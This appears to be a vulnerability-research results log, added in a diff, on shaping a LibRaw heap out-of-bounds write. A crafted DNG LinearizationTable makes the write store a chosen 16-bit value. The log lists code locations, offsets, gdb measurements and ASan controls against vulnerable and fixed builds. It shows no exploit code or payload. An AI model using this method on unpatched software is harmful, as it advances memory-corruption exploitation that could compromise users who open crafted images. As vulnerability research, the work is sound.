@@ -1,0 +1,68 @@
+W11 results — arbitrary 16-bit halfword from a DNG LinearizationTable (2026-11-24)
+
+Prediction was recorded on SITE/walls/libraw2shell.md before the first run
+(15:57Z): pinned src/metadata/tiff.cpp:1109-1113 parses DNG tag 0xc618 via
+linear_table(len), src/utils/curves.cpp:145-155 fills curve[] from file
+bytes and extends the last value over all 65,536 entries, and
+src/decoders/dng.cpp:34-51 (adobe_copy_pixel) stores curve[raw] into RAW().
+A SHORT/1 table should therefore replace every decoded sample with a
+file-chosen value. Risk noted in advance: identify.cpp:1605 overwrites
+`maximum` with WhiteLevel, so the stored halfword might be a scaled value.
+
+Generator: craft_linearization_poc.py sha256
+74ca3ee9a74e410682bb3588c0e99fa9c499f294ca79eb76e1055d4fb213cc1c.
+It rewrites the pinned MiniDNG PoC's unused IFD slot 2 (tag 0x00fe, LONG
+count 1 value 0) as tag 0xc618, SHORT count 1. The JPEG strip, CFA and
+WhiteLevel are untouched. Source for all W11 inputs is
+evidence/nonzero-oob.input; WhiteLevel is then set to 65535 with the
+existing craft_whitelevel_poc.py so the scaling factor is 65535/65535 = 1.
+
+Negative that shaped the method: LinearizationTable=0x1234 with the source's
+WL=255 still stores 0xffff at :427 (saturation). WL=65535 is required.
+A first low-value probe, LinearizationTable=0x0010 with WL=255, stored
+0x1010-ish values, confirming the table is applied rather than overwritten.
+
+Fast mapping (w11/fast.gdb, sha256
+dac6f6d2efc1c6b4337588ad06d4d331f97731a623df1e12f9b161f04b0d8468;
+breakpoint ignore 68643 lands at IDX=73365, a uniform-field index):
+  chosen V -> stored channel 1
+  0x0001 -> 0x0001   0x00a5 -> 0x00a5   0x1337 -> 0x1337
+  0x7f7f -> 0x7f7f   0x8000 -> 0x8000   0xbeef -> 0xbeef
+  0xffff -> 0xffff
+
+Exact first-OOB index (w11/probe.gdb, sha256
+4fb4a4cb92024ec483ceb1a151edbe83d3267e8c494b3bf06718af6bff18afaf;
+unmodified -O0 build, `dcraw_emu -n 1 INPUT`, 3/3 byte-identical runs each):
+  targetbeef.input sha256
+    cf5030ebfa46f3badc4498e4ec4230c670ba010b70f5ace3a872d8fcbc33d33b
+    IDX=68644 avg=131070,97758,130342,2 black=0 white=65535
+    VAL: 0xffff 0xbeef 0xfe93 0x0000  (beef-gdb-1.txt .. -3.txt)
+  target1337.input sha256
+    b10072878cda73d1530a3156789e9742ccd791a9389f589516548dd9bd23cd8f
+    IDX=68644 avg=14754,9838,13116,2 black=0 white=65535
+    VAL: 0x1cd1 0x1337 0x199e 0x0000  (1337-gdb-1.txt .. -3.txt)
+  target00a5.input sha256
+    d01e8cba907216b7fab1fad070e52f4d529271074b9f93c0b75573bfb440d548
+    IDX=68644 avg=492,330,438,2 black=0 white=65535
+    VAL: 0x00f6 0x00a5 0x00db 0x0000  (00a5-gdb-1.txt .. -3.txt)
+Edge values, one exact-index run each:
+  target0001.input sha256
+    1ca11ebfa5fdcfbd02fe85f13c6690023c3c588e193dbb9c1d124121385a769d
+    IDX=68644 VAL 0x0000 0x0001 0x0001 0x0000 (0001-gdb-exact.txt)
+  targetffff.input sha256
+    93ad684af7b1fe11846711293cb0f998d27de67cfb96666df6570242ef8bf7d4
+    IDX=68644 VAL 0xffff 0xffff 0xffff 0x0000 (ffff-gdb-exact.txt)
+
+Controls on targetbeef, target1337, target00a5, target0001, targetffff:
+ASan vulnerable `pinned/.../dcraw_emu -n 1 INPUT` rc 1 with `WRITE of size 2`
+at xtrans_demosaic.cpp:427; fixed `fixed/.../dcraw_emu -n 1 INPUT` rc 0 empty;
+vulnerable without -n rc 0 empty. Logs: w11/*-asan-{vuln,fixed,safe}.out.
+
+Limits: the linearization field plus WL=65535 give an arbitrary 16-bit value
+in the second halfword stored at the chosen offset (0xbeef, 0x1337, 0x00a5
+exact 3/3, edges 0x0001/0xffff once). The first and third halfwords come
+from X-Trans interpolation and are not independently chosen: at index 68,644
+they were 0xffff/0xfe93 for 0xbeef, 0x1cd1/0x199e for 0x1337, 0x00f6/0x00db
+for 0x00a5. That is not an arbitrary byte sequence across the whole store.
+No pointer/IP, marker, command, adjacent live object, GUI consumer, wire
+path or r5. Author-side only; no witness replay. All experiments local.
